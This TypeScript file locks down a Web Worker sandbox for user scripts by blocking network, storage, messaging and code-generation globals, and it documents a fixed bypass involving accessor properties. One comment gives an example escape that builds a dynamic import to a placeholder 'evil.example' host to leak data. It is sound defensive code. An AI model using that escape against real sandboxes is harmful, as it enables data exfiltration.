/** Every global a user script must never reach, neutralized once at the top of
 *  scriptWorkerEntry.ts — before `onmessage` is even registered, so there's no window where a
 *  message could be processed against an unlocked worker. `Worker` itself is included: a Worker
 *  can spawn nested workers, which would otherwise be a trivial way back out to everything this
 *  list is trying to block. Deliberately *not* included: `Math`/`Date`/`JSON`/`Array`/typed
 *  arrays/`Map`/`Set` — safe, pure-value builtins a script legitimately needs (see runScript.ts's
 *  own doc on why `Date` specifically is left ticking rather than frozen). `console` is wrapped,
 *  not blocked — see buildScriptApi.ts. */
const BLOCKED_GLOBALS = [
  "fetch",
  "XMLHttpRequest",
  "WebSocket",
  "importScripts",
  "Worker",
  "indexedDB",
  "caches",
  "Notification",
  // The worker's own back-channel to the host — otherwise reachable by a user script exactly the
  // same way every other ambient global here is (it's a plain identifier in the Worker's global
  // scope, not something `new Function(...params...)` scopes away), letting a script forge its
  // own fake ScriptRunResult (crashing the host's own onmessage handler, or flooding it) instead
  // of ever going through runScript.ts's real return value. scriptWorkerEntry.ts captures the
  // real one under a different name *before* this lockdown runs, for its own legitimate one
  // postMessage-per-run.
  "postMessage",
  // Neither is a route to more code the way importScripts/Worker are exactly, but each is a route
  // *around* every restriction above: a script could otherwise build and run a brand new function
  // at runtime — e.g. Function("return import('https://evil.example/?d='+leak)")() — that never
  // appears anywhere in its own literal source text, or use direct/indirect eval the same way.
  // runScript.ts itself captures the real Function constructor under a different name *before*
  // this lockdown runs, for its own one `new Function(scriptCode)` compile step.
  "Function",
  "eval",
] as const;

/** Overrides `name` on `target` with a function that always throws, via `Object.defineProperty`
 *  rather than a plain `target[name] = ...` assignment — confirmed empirically (M6, cross-engine,
 *  via a real Worker under Chromium/Firefox/WebKit) to matter for real: `indexedDB` and `caches`
 *  are *accessor* properties (a getter, no setter) inherited from the Worker global scope's own
 *  prototype, not plain own data properties. A plain assignment to a setter-less accessor throws in
 *  strict mode (every module Worker always is) — silently caught by the `try/catch` below, leaving
 *  the original, fully-functional getter completely intact, a genuine sandbox bypass this had
 *  before this fix (a script could reach the host page's own IndexedDB/Cache Storage). `defineProperty`
 *  sidesteps the accessor's own get/set semantics entirely by redefining the property descriptor
 *  outright, which succeeds against a getter-only accessor exactly as well as a plain data
 *  property, as long as the property itself is `configurable` (every target here is, confirmed the
 *  same way). The `try/catch` stays as defense-in-depth's own admission of its limits — if some
 *  environment ever exposes one of these as non-configurable, this can't force it closed either,
 *  which is exactly why the approved plan calls this "eventual forced termination" (the timeout
 *  backstop in useScriptEngine.ts), not airtight sandboxing. */
function blockGlobal(target: object, name: string) {
  try {
    Object.defineProperty(target, name, {
      value: () => {
        throw new Error(`"${name}" n'est pas accessible depuis un script.`);
      },
      writable: true,
      configurable: true,
    });
  } catch {
    // Non-configurable in this engine — nothing more this mechanism can do.
  }
}

export function lockDownGlobals() {
  const globalScope = self as unknown as Record<string, unknown>;
  for (const name of BLOCKED_GLOBALS) {
    blockGlobal(globalScope, name);
  }
  // navigator.sendBeacon sits one level down, not a top-level global — same override, scoped to
  // just this one method rather than freezing all of `navigator` (a script reading e.g.
  // navigator.userAgent is harmless and not worth blocking).
  blockGlobal(navigator, "sendBeacon");
}
